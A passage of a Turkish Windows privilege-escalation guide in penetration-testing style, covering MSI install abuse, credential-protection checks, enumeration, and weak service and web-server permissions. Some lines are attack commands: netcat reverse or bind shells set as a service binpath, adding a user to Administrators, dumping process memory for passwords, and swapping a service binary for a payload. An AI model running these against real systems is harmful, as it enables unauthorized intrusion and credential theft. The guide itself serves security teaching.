  - `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` uyarısı gösterilirse, platformu x64 olarak ayarladığınızdan emin olun.

### MSI Kurulumu

Kötü amaçlı `.msi` dosyasını arka planda **yüklemek** için:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Bu güvenlik açığından yararlanmak için şunu kullanabilirsiniz: _exploit/windows/local/always_install_elevated_

## Antivirüs ve Algılayıcılar

### Denetim Ayarları

Bu ayarlar nelerin **kaydedileceğini** belirler, bu yüzden bunlara dikkat etmelisiniz

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding'de logların nereye gönderildiğini bilmek ilginçtir.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS**, etki alanına katılmış bilgisayarlardaki **yerel Administrator parolalarını yönetmek** için tasarlanmıştır. Her parolanın **benzersiz, rastgele ve düzenli olarak güncellenmiş** olmasını sağlar. Bu parolalar Active Directory içinde güvenli bir şekilde saklanır ve yalnızca ACL'ler aracılığıyla yeterli izin verilmiş kullanıcılar tarafından görüntülenebilir; böylece yetkili kullanıcılar yerel admin parolalarına erişebilir.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Etkinse, **düz metin parolalar LSASS** (Local Security Authority Subsystem Service) içinde saklanır.\
[**Bu sayfada WDigest hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

**Windows 8.1** ile birlikte Microsoft, sistemi daha da güvenli hale getirmek için güvenilmeyen işlemlerin **belleğini okuma** veya kod enjekte etme girişimlerini **engellemek** amacıyla Local Security Authority (LSA) için gelişmiş koruma sunmaya başladı.\
[**LSA Protection hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard**, **Windows 10** ile kullanıma sunuldu. Amacı, bir cihazda depolanan kimlik bilgilerini pass-the-hash saldırıları gibi tehditlere karşı korumaktır. [**Credential Guard hakkında daha fazla bilgiye buradan ulaşabilirsiniz.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Önbelleğe Alınmış Kimlik Bilgileri

**Etki alanı kimlik bilgileri**, **Local Security Authority** (LSA) tarafından doğrulanır ve işletim sistemi bileşenleri tarafından kullanılır. Bir kullanıcının oturum açma verileri kayıtlı bir güvenlik paketi tarafından doğrulandığında, kullanıcı için genellikle etki alanı kimlik bilgileri oluşturulur.\
[**Önbelleğe Alınmış Kimlik Bilgileri hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Kullanıcılar ve Gruplar

### Kullanıcıları ve Grupları Listeleme

Üyesi olduğunuz gruplardan herhangi birinin ilginç izinlere sahip olup olmadığını kontrol etmelisiniz.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Ayrıcalıklı gruplar

**Ayrıcalıklı bir gruba üyeyseniz ayrıcalıklarınızı yükseltebilirsiniz**. Ayrıcalıklı gruplar ve ayrıcalık yükseltmek için bunların nasıl kötüye kullanılabileceği hakkında bilgi edinin:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

Bu sayfada **token** hakkında daha fazla bilgi edinin: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
**İlginç token'lar hakkında bilgi edinmek** ve bunların nasıl kötüye kullanılabileceğini öğrenmek için aşağıdaki sayfaya göz atın:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Oturum açmış kullanıcılar / Oturumlar

```bash
qwinsta
klist sessions
```

### Ev klasörleri

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Parola Politikası

```bash
net accounts
```

### Panonun içeriğini al

```bash
powershell -command "Get-Clipboard"
```

## Çalışan İşlemler

### Dosya ve Klasör İzinleri

Öncelikle, işlemleri listelerken **işlemin komut satırında parola olup olmadığını kontrol edin**.\
Çalışan bir binary'nin **üzerine yazıp yazamayacağınızı** veya olası [**DLL Hijacking saldırılarından**](dll-hijacking/index.html) yararlanmak için binary klasöründe yazma izniniz olup olmadığını kontrol edin:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Her zaman çalışan [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md) olup olmadığını kontrol edin; bunları ayrıcalıkları yükseltmek için kötüye kullanabilirsiniz.

Bir debugger listener kısa süreliğine açık olabilir; bu nedenle tek bir pasif port anlık görüntüsünde görünmemesi, daha önce hiçbir zaman açığa çıkmadığını kanıtlamaz. Gözlemlenen listener'ı PID'si, süreç sahibi ve düşük ayrıcalıklı kullanıcının ona erişebilmesiyle ilişkilendirin; tek başına uygulama adı veya debug flag'i, kullanıcılar arası code execution olduğunu kanıtlamaz. Rutin enumerasyonu pasif tutun; debugger komutları göndermeyin.

**Süreçlerin binary dosyalarının izinlerini kontrol etme**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Süreç ikililerinin bulunduğu klasörlerin izinlerini kontrol etme (**[**DLL Hijacking**](dll-hijacking/index.html)**)** **

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort dynamic preprocessor dizinleri

Snort 2, yapılandırmada `snort.exe -c <config>` ile seçilen bir `dynamicpreprocessor directory` üzerinden paylaşılan kitaplıkları yükleyebilir. Snort'u farklı bir hesapla çalıştıran zamanlanmış görev veya hizmet için tam yapılandırmayı ve belirtilen modül dizininin ACL'sini inceleyin. Token'ınız bu dizinde dosya oluşturabiliyorsa, görev veya hizmet modülleri bir sonraki yüklediğinde bu yol code execution açısından incelenmeye adaydır. Çalıştırma hesabının etkin ayrıcalıklarını, etkin yapılandırmayı, modül uyumluluğunu ve tüm deny veya share kısıtlamalarını doğrulayın; yalnızca yazılabilir bir dizin olması privilege escalation olduğunu kanıtlamaz. [Snort'un dynamic preprocessor belgeleri](https://www.snort.org/documents/dpx-readme), çalışma zamanında modül yüklemeyi açıklar.

### Yazılabilir bir document root'a sahip ayrıcalıklı web hizmeti

Windows Apache kurulumunda, hizmetin çalıştırılabilir dosya yolunu ve çalıştırma hesabını, etkin `httpd.conf` dosyasındaki `DocumentRoot` ile karşılaştırın. Geleneksel bir XAMPP düzeninde `C:\xampp\apache\conf\httpd.conf` dosyasını ve yapılandırılmış document root'un ACL'sini (genellikle `C:\xampp\htdocs`) inceleyin. Apache `LocalSystem` olarak çalışırken daha düşük ayrıcalıklı bir kullanıcı bu kökte dosya oluşturabiliyorsa, sunucu tarafında code execution ana makinenin ayrıcalık sınırını aşabilir. Hizmetin çalıştığını, tam yolun sunulduğunu ve sunucu tarafı bir handler'ın dosya türünü işlediğini doğrulayın; tek başına yazılabilir bir kök dizin yalnızca dosya oluşturulabildiğini kanıtlar. ACL'leri bir deneme dosyası yazmadan inceleyin:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

For a conventional WAMP kurulumu, service, sürümlü bir `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (veya 32-bit düzen için `C:\wamp\...`) dosyasını işaret ediyor olabilir; yapılandırma dosyası bunun yanındaki `conf\httpd.conf` konumunda, varsayılan kök dizin ise `C:\wamp64\www` veya `C:\wamp\www` olabilir. Kesin service image değerini, çalıştırma hesabını, etkin `DocumentRoot` değerini (`${INSTALL_DIR}` açılımı ve virtual-host geçersiz kılmaları dâhil) ve kök dizinin ACL’sini birlikte kontrol edin. Yazılabilir bir WAMP dizini, Apache'nin `SYSTEM` olarak çalıştığını veya gönderilen dosyayı çalıştırdığını kanıtlamaz. [Apache, bir Windows service'in yapılandırmasını nasıl seçtiğini belgeliyor](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Yazılabilir IIS kök dizini ve application-pool ağ kimliği

IIS için, yazılabilir bir fiziksel dizini `applicationHost.config` içindeki **etkin bir site/uygulama** ile eşleştirin; ardından yapılandırılmış pool'u ve sunucu tarafındaki handler'ı belirleyin. Sunulan bir dizine yerleştirilen kod, ancak IIS o dosya türünü işliyorsa ve ilgili route erişilebilirse pool kimliğiyle çalışır. Yazılabilir bir dizini kod çalıştırma olarak değerlendirmeden önce geçerli kullanıcının etkin dosya oluşturma iznini, site'nin çalışma durumunu, handler'ı ve yola özel geçersiz kılmaları kontrol edin.

ASP.NET dinamik derlemesi, incelenmesi gereken ayrı bir yol sunar: uygulamanın derleme dizini altındaki oluşturulmuş dosyalar. Varsayılan konum, ilgili .NET Framework kurulumunun altındaki `Temporary ASP.NET Files` dizinidir; ancak uygulamanın `<compilation tempDirectory>` ayarı bunu değiştirebilir. [Microsoft, konumu ve uygulama başına alt dizinleri belgeliyor](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) ve [application pool'lar birbirine güvenmediğinde derleme dizinlerinin yalıtılmasını öneriyor](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Daha düşük yetkili bir token, **belirli** uygulamanın önbelleğindeki oluşturulmuş kaynak kodu değiştirebiliyorsa, uygulamanın bunu daha ayrıcalıklı bir [worker-process kimliği](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) altında yeniden derleyip derlemediğini belirleyin. Tek başına bir dosya veya dizin ACL’si kod çalıştırmayı kanıtlamaz: önbelleği etkin uygulama, etkin token ve ACL, derleme ayarları, process kimliği ve olası yeniden derlemenin zamanlamasıyla ilişkilendirin. Salt okunur metadata incelemesi yapın; enumeration sırasında derlemeyi tetiklemeyin veya önbellek dosyalarını değiştirmeyin.

`ApplicationPoolIdentity` veya `NetworkService` olarak yapılandırılmış bir IIS pool'u, yerel token'ı düşük ayrıcalıklı olsa bile, domain kaynaklarında genellikle **host bilgisayar hesabı** olarak kimlik doğrular. `LocalSystem` zaten yerel olarak yüksek ayrıcalıklıdır ve ağda da bilgisayar hesabını kullanır; `LocalService` ise normalde anonim ağ kimlik bilgileri sunar. `SpecificUser` pool'u bunun yerine yapılandırılmış hesabı kullanır. [Microsoft bu kimlik türlerini](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) ve [application-pool ağ kimliğini](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) belgeliyor. Kimlik ayarının belirtilmemesi, IIS sürümleri arasında farklılık gösteren pool varsayılanlarının devralınmasına neden olabilir; bu yüzden pool adından tahmin yürütmek yerine etkin yapılandırmayı çözümleyin. Kod çalıştırma, ağda bilgisayar kimliğini kullanan bir pool'a ulaşıyorsa **ilgili bilgisayarın** dizin izinlerini değerlendirin. [DCSync](../active-directory-methodology/dcsync.md), domain naming context üzerinde replication izinleri gerektirir; bir machine-account ticket'ı veya host rolü tek başına bu izinlerin bulunduğunu kanıtlamaz. Pasif enumeration sırasında dosya yüklemeden, ağda kimlik doğrulaması yapmadan veya ticket istemeden yapılandırma ve ACL’leri inceleyin.

Bir yardımcı process başlatan, okunabilir bir ASP.NET handler için istekten gelen bir değeri kimlik doğrulama, şifre çözme, doğrulama ve komut oluşturma aşamalarında izleyin. Çözümlenmiş bir token'ı `ProcessStartInfo("cmd", "/c ...")` içine birleştiren bir handler, shell metakarakterlerinin komutu değiştirmesine izin verebilir; [Microsoft, `cmd` özel karakterlerini belgeliyor](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Güvenilmeyen bir çağıranın çözümlenmiş değeri gerçekten etkileyebildiğini ve handler'a erişebildiğini belirleyin; ardından etkin application-pool veya impersonation kimliğini ve child process'in kimliğini çözümleyin. Okunabilir bir kaynak kodu satırı, localhost listener'ı veya token biçimindeki bir zayıflık tek başına ayrıcalıklı komut çalıştırmayı kanıtlamaz. Pasif enumeration sırasında sahte istekler göndermeden veya yardımcı programı çalıştırmadan kaynak kodunu ve pool yapılandırmasını inceleyin.

Windows üzerinde çalışan bir PHP service için, istekle denetlenebilen ve [`include` veya `require`](https://www.php.net/manual/en/function.include.php) fonksiyonuna aktarılan bir path, düşük kullanıcının yazabildiği bir PHP dosyasını worker kimliği altında değerlendirebilir. İsteğin ilgili ifadeye ulaşabildiğini, çözümlenen path'in düşük kullanıcının değiştirebildiği ve worker'ın okuyabildiği bir dosyayı gösterdiğini, geçerli PHP path kısıtlamalarının include işlemine izin verdiğini ve worker'ın gerçekten daha yüksek ayrıcalıklarla çalıştığını doğrulayın. Loopback listener'ı veya yazılabilir bir dosya tek başına bu zinciri kanıtlamaz; pasif enumeration sırasında endpoint'i çağırmadan kaynak kodunu, service kimliğini ve dosya ACL’lerini inceleyin.

### Bellekten parola madenciliği

Sysinternals içindeki **procdump** ile çalışan bir process'in memory dump'ını oluşturabilirsiniz. FTP gibi service'ler **kimlik bilgilerini bellekte açık metin olarak** tutar; belleği dump etmeyi ve kimlik bilgilerini okumayı deneyin.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Güvenli olmayan GUI uygulamaları

**SYSTEM olarak çalışan uygulamalar, bir kullanıcının CMD başlatmasına veya dizinlere göz atmasına izin verebilir.**

Örnek: "Windows Help and Support" (Windows + F1), "command prompt" için arama yapın, "Click to open Command Prompt" seçeneğine tıklayın

### Ayrıcalıklı proje dosyası içe aktarma

Düşük yetkili bir kullanıcının yazabildiği bir bırakma dizinindeki projeleri otomatik olarak açan bir uygulama, içe aktarıcının hesabı altında bir girdi güven sınırını aşar. **Tam yazılabilir yolu**, bu yolu açan işlemi veya görevi, etkin kimliğini ve ayrıştırıcı derlemesini inceleyin. [Geçmişteki bir Ghidra proje açma/geri yükleme sorunu](https://github.com/NationalSecurityAgency/ghidra/issues/71), proje meta verilerinde XML external entity kullanımına izin veriyordu; Windows'ta bir ağ entity'si, [giden SMB ve NTLM ilkesi](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) izin veriyorsa içe aktaran hesabın kimlik doğrulamasına neden olabilirdi. Bu, kimlik bilgisi açığa çıkma olasılığına işaret eder; doğrudan yönetici erişimi sağlamaz: yanıtın ayrı bir yetkili veya savunmasız yol üzerinden kullanılabilmesi gerekir ve güncel derlemeler gerçek yama durumlarına göre değerlendirilmelidir. Pasif enumeration sırasında hazırlanmış bir projeyi açmayın; içe aktarma iş akışını ve ACL'leri inceleyin.

## Hizmetler

Service Control Manager (SCM) nesnesinin [`SC_MANAGER_CREATE_SERVICE` hakkı](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights), mevcut bir hizmet üzerindeki haklardan ayrıdır. Bu hak için salt okunur bir [`OpenSCManager` erişim isteğinin](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) başarılı olması, yeni bir hizmetin çalıştırılabileceğini kanıtlamaz; yalnızca inceleme için bir ipucudur. [`CreateService`, istenen hizmet erişimine sahip bir handle döndürür](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew); hizmet daha sonra yeniden açıldığında ayrı bir erişim denetimi yapılır ve ilk handle kullanılabilecek olsa bile bu işlem başarısız olabilir. Etkin yerel veya uzak token'ı, verilen handle haklarını, hizmet hesabını, başlatma ilkesini ve yürütülebilir dosya yolunu ayrı ayrı doğrulayın. Pasif enumeration sırasında hizmet oluşturmayın veya başlatmayın.

Uzak bir hizmet kurulum yolu için bu SCM haklarını, hedefte **aynı ağ oturum açma hesabının** yazabildiği bir paylaşım, paylaşımın temelindeki NTFS ACL ve hizmet hesabının çalıştırabildiği yerel bir yürütülebilir dosya yolu ile birlikte değerlendirin. Alışılmadık ölçüde geniş SCM hakları ve dosya yerleştirme yolu birlikte mevcutsa, yönetici olmayan bir hesap bu sınırı aşabilir; yönetim paylaşımı zorunlu değildir. Yalnızca paylaşımda yazma erişimi veya yalnızca SCM'de hizmet oluşturma hakkı bulunması, yeni hizmetin daha yüksek bir kimlikle başlatılabileceğini kanıtlamaz.

Mevcut bir hizmet, yardımcı dosya `ImagePath` içinde belirtilmemiş olsa bile başlatma, kapatma veya başka bir yaşam döngüsü olayı sırasında bir yardımcı yürütülebilir dosya çağırabilir. Yardımcı dosyanın adı, düşük yetkili bir kullanıcının yazabildiği bir dizine çözümleniyorsa ve hizmet daha yüksek bir kimlikle çalışıyorsa, eksik yardımcı dosya koşullu bir değiştirme adayıdır. **Gerçek hizmet kodunu veya belgelenmiş yardımcı çağrısını**, çözümlenen yürütülebilir dosya yolunu ve arama sırasını, dizin oluşturma haklarını, hizmet kimliğini ve kullanılabilir bir yaşam döngüsü tetikleyicisini doğrulayın. Yazılabilir bir hizmet dizini veya eksik bir dosya tek başına hizmetin bu dosyayı yükleyeceğini kanıtlamaz; pasif inceleme sırasında hizmeti başlatmayın veya durdurmayın.

Mevcut bir hizmet için [`SERVICE_START`, `StartService` çağrısına argüman verilmesine izin verir](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); bu hak [`SERVICE_CHANGE_CONFIG` hakkından](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) farklıdır. Başlatma erişimini yalnızca bir denetim hakkından fazlası olarak değerlendirmeden önce hizmetin kodunu veya belgelenmiş arayüzünü inceleyin. Hizmet, çağıranın seçtiği bir argümanı günlük veya dışa aktarma yolu olarak kullanıyorsa hizmet kimliğini, argümandan yazma işlemine giden tam akışı, yol kısıtlamalarını ve **oluşturulan dosyanın** izinlerini doğrulayın. Korumalı bir dizine yazma işlemi yalnızca, bu dosyayı kabul eden ayrı bir ayrıcalıklı tüketici veya yükleyici varsa ayrıcalık yükseltmeye dönüşebilir; yazılabilir bir günlük veya başlatma hakkı tek başına yeterli değildir. Pasif envanter sırasında hizmeti başlatmayın veya test dosyası oluşturmayın.

NSClient++ izleme aracısı için okunabilir bir `nsclient.ini`, bir **yapılandırma inceleme ipucudur**: web kimlik bilgilerini içerebilir; `boot.ini` ise yapılandırmayı başka bir konuma yönlendirebilir. Gerçek hizmet hesabını, WEB dinleyicisini ve erişim ilkesini, ayrıca kimliği doğrulanmış rolün ayarları veya script'leri değiştirip değiştiremeyeceğini kontrol edin. Ayrıcalıklı yürütme için ek olarak `CheckExternalScripts` (veya etkin başka bir yürütme yolu), bir komutu kaydetme ya da değiştirme konusunda geçerli bir hak ve komutu hizmet kimliği altında çalıştıran bir tetikleyici gerekir. Yalnızca yerel döngü arabirimini dinleyen bir dinleyiciye yine de yerel bir kullanıcı erişebilir; ancak dosya yolu, parola veya dinleyici tek başına bu hakların mevcut olduğunu kanıtlamaz. Pasif enumeration sırasında sırları görüntülemeden veya web API'sini çağırmadan meta verileri ve izinleri inceleyin. Bkz. [NSClient++ dosya düzeni](https://nsclient.org/docs/concepts/file-layout/), [web ve script güvenliği rehberi](https://nsclient.org/docs/setup/securing/) ve [external-script yapılandırması](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

`ImagePath` değeri `nssm.exe` olan bir hizmet için hizmetin gerçek çalıştırma hesabını ve `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application` değerini inceleyin: [NSSM alt uygulamayı burada depolar](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h); `AppDirectory` ise yapılandırılmış çalışma dizinidir. Wrapper'ın izinlerini hizmet sınırının tamamı olarak değerlendirmeden önce alt yürütülebilir dosyayı ve üst dizin ACL'lerini kontrol edin. Bu alt uygulamanın sunduğu yerel bir WCF veya SOAP endpoint'i ayrı bir inceleme ipucudur: düşük yetkili kullanıcının dinleyiciye erişebildiğini, tam olarak hangi işlemin kullanıcının girdisini kabul ettiğini ve hizmet alt uygulamasının güvenli olmayan işlemi daha yüksek bir kimlikle yürüttüğünü doğrulayın. Hizmet hesabı, bir endpoint URL'si veya yazılabilir bir yol tek başına ayrıcalık yükseltmeyi kanıtlamaz; pasif enumeration sırasında hizmet işlemlerini çağırmaktan kaçının.

Özel bir WCF işlemi için çağıranın denetimindeki bir dizgenin herhangi bir PowerShell runspace'ine aktarılıp aktarılmadığını izleyin. [`Pipeline.Commands.AddScript`, script metni ekler](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript) ve [`Pipeline.Invoke`, pipeline'ı çalıştırır](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [Windows aktarım kimlik bilgileri kullanan bir `netTcpBinding`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) istemcinin kimliğini doğrular; ancak **belirli** işlemi çağırma yetkisi ve runspace'in etkin kimliği ayrıca kontrol edilmelidir. Düşük yetkili bir çağıranın girdisinden daha yüksek bir hizmet kimliği altında `AddScript` kullanımına giden yol, bir kod yürütme sınırıdır; dinleyen bir port, kimliği doğrulanmış bir istemci veya ilgisiz bir assembly'deki kullanılmayan bir yöntem tek başına kanıt değildir. Enumeration sırasında endpoint'i çağırmadan dağıtılan hizmeti, sözleşmeyi, yetkilendirmeyi ve impersonation ayarlarını statik olarak inceleyin.

Service Triggers, belirli koşullar (named pipe/RPC endpoint etkinliği, ETW olayları, IP kullanılabilirliği, cihaz bağlanması, GPO yenilemesi vb.) oluştuğunda Windows'un bir hizmeti başlatmasını sağlar. SERVICE_START hakları olmasa bile tetikleyicileri çalıştırarak ayrıcalıklı hizmetleri çoğu zaman başlatabilirsiniz. Enumeration ve etkinleştirme teknikleri için buraya bakın:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio tanılama toplayıcı hizmeti

C/C++ araçlarını içeren Visual Studio kurulumlarında `LocalSystem` olarak çalışacak şekilde yapılandırılmış `VSStandardCollectorService150` tanılama hizmeti bulunabilir. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/), hizmet DACL sıfırlamasını yönlendirmek için bir junction ve object-manager-link yarış durumundan yararlandı. Gösterilen ayrıcalık yükseltme ayrıca kullanılabilir bir Visual Studio Setup WMI Provider MSI onarım yolunu ve bu yoldaki `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` hedefini gerektiriyordu. Bileşen Ocak 2024'te düzeltildi.

Pasif ilk inceleme için yalnızca bu hizmetin hesabını ve ikili dosya yolunu inceleyin, Setup WMI derleyici yolunun mevcut olup olmadığını kontrol edin ve kurulu bileşenin yama durumunu doğrulayın. Bir hizmet girdisi, Visual Studio ürün sürümü veya derleyici dosyası tek başına ana makinenin savunmasız olduğunu kanıtlamaz. İnceleme sırasında hizmeti başlatmanız veya onarım çalıştırmanız gerekmez.

Hizmetlerin listesini alın:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### İzinler

Bir hizmet hakkında bilgi edinmek için **sc** kullanabilirsiniz.

```bash
sc qc <service_name>
```

Her hizmet için gereken ayrıcalık düzeyini kontrol etmek üzere _Sysinternals_’tan **accesschk** binary’sinin bulundurulması önerilir.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

"Authenticated Users" grubunun herhangi bir hizmeti değiştirebilip değiştiremediğini kontrol etmeniz önerilir:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[XP için accesschk.exe dosyasını buradan indirebilirsiniz](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Hizmeti etkinleştirme

Bu hatayı alıyorsanız (örneğin SSDPSRV ile):

_Sistem hatası 1058 oluştu._\
_Hizmet başlatılamıyor; çünkü devre dışı bırakılmış veya kendisiyle ilişkili etkin bir cihaz yok._

Şunu kullanarak etkinleştirebilirsiniz:

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**upnphost hizmetinin çalışması için SSDPSRV'ye bağlı olduğunu göz önünde bulundurun (XP SP1 için)**

**Bu soruna yönelik başka bir geçici çözüm** şunu çalıştırmaktır:

```
sc.exe config usosvc start= auto
```

### **Modify service binary path**

"Authenticated users" grubunun bir hizmet üzerinde **SERVICE_ALL_ACCESS** yetkisine sahip olduğu senaryoda, hizmetin yürütülebilir ikili dosyasını değiştirmek mümkündür. **sc**'yi değiştirmek ve çalıştırmak için:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Hizmeti yeniden başlat

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Ayrıcalıklar çeşitli izinler üzerinden yükseltilebilir:

- **SERVICE_CHANGE_CONFIG**: Servis binary'sinin yeniden yapılandırılmasına izin verir.
- **WRITE_DAC**: İzinlerin yeniden yapılandırılmasını sağlar ve böylece servis yapılandırmalarını değiştirme olanağı sunar.
- **WRITE_OWNER**: Sahipliğin alınmasına ve izinlerin yeniden yapılandırılmasına izin verir.
- **GENERIC_WRITE**: Servis yapılandırmalarını değiştirme yeteneğini de sağlar.
- **GENERIC_ALL**: Servis yapılandırmalarını değiştirme yeteneğini de sağlar.

Bu güvenlik açığının tespiti ve istismarı için _exploit/windows/local/service_permissions_ kullanılabilir.

### Servis binary'lerinde zayıf izinler

Bir servis **`LocalSystem`**, **`LocalService`**, **`NetworkService`** veya ayrıcalıklı bir domain hesabı olarak çalışıyorsa; ancak **düşük ayrıcalıklı kullanıcılar servis EXE'sini veya üst klasörünü değiştirebiliyorsa**, servis çoğu zaman **binary değiştirilip servis yeniden başlatılarak** ele geçirilebilir.

Bir servisin çalıştırdığı binary'yi değiştirip değiştiremeyeceğinizi veya binary'nin bulunduğu klasör üzerinde **yazma izniniz** olup olmadığını kontrol edin ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Bir servisin çalıştırdığı tüm binary'leri **wmic** kullanarak (system32'de değil) alabilir ve **icacls** kullanarak izinlerinizi kontrol edebilirsiniz:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Ayrıca **sc** ve **icacls** kullanabilirsiniz:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

**`Everyone`**, **`BUILTIN\Users`** veya **`Authenticated Users`** için verilmiş tehlikeli ACL’leri arayın; özellikle hizmet yürütülebilir dosyasında veya onu içeren dizinde **`(F)`**, **`(M)`** ya da **`(W)`** izinlerine dikkat edin. Uygulanabilir bir istismar akışı:<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` ile hizmet hesabını ve yürütülebilir dosya yolunu doğrulayın.
2. `icacls <path>` ile binary’nin yazılabilir olduğunu doğrulayın.
3. Hizmet binary’sini bir payload veya geçerli bir kötü amaçlı hizmet binary’siyle değiştirin.
4. Hizmeti `sc stop <service_name> && sc start <service_name>` ile yeniden başlatın (veya sistemin yeniden başlatılmasını / hizmet tetikleyicisini bekleyin).

Yararlı otomatik kontroller:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
